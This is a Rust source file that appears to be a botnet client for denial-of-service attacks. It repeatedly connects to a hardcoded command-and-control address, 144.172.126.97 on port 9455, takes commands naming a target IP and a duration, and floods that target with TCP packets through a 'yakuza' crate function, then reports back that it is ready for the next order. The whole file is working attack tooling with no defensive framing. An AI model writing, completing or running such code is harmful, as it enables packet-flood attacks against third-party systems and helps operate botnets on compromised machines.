extern crate rand;
extern crate pnet;
extern crate yakuza;
extern crate pnet_base;
extern crate pnet_packet;
extern crate pnet_datalink;
extern crate pnet_transport;

use yakuza::tcp::packet::{send_tcp_packets};


use std::string::String;
use std::net::{TcpStream, Ipv4Addr, Shutdown};
use std::io::{Read, Write};
use std::{thread, time};


fn parse_data(command:String) -> Result<(Ipv4Addr, u64), &'static str>{
    let command = command.trim_end_matches(char::from(0));
    println!("{}",command);
    let data: Vec<&str> = command.split("|").collect();
    let ip = data[0].parse::<Ipv4Addr>().unwrap();
    let duration = data[1].parse::<u64>().unwrap();
    Ok((ip,duration))
}


fn main() {
    let hello : [u8; 1] = [0];
    let goodbye : [u8; 1] = [1];
    let free : [u8; 1] = [3];
    let mut buff = [0 as u8; 19];

    loop {

        match TcpStream::connect("144.172.126.97:9455") {
            Ok(mut stream) => {
                stream.write(&hello).ok();

                loop {
                    match stream.read(&mut buff) {
                        Ok(_) => {
                                let command = String::from_utf8((&buff).to_vec()).unwrap();
                                let data = parse_data(command).unwrap();
                            let sent_packets : u64 = send_tcp_packets(data.0, data.1);
                            println!("Sent {} packets",sent_packets);
                            match stream.write(&free) {
                                Ok(_) => {}
                                Err(_) => {break}
                            }
        
                        }
                        Err(e) => {
                            match stream.write(&goodbye) {
                                Ok(_) => {}
                                Err(goodbye_error) => {println!("STREAM DC {} NO GOODBYE {}",e,goodbye_error)}
                            };
                            match stream.shutdown(Shutdown::Both) {
                                Ok(_) => {}
                                Err(shutdown_error) => {println!("STREAM DC {} NO GOODBYE {}",e,shutdown_error)}
                            }
                            println!("STREAM DC {}",e);
                            break
                        }
                    }
                }

            }
            Err(e) => {
                println!("Error creating tcp stream : {} Waiting 10s",e);
                thread::sleep(time::Duration::from_secs(10));
            }
        }
    }
}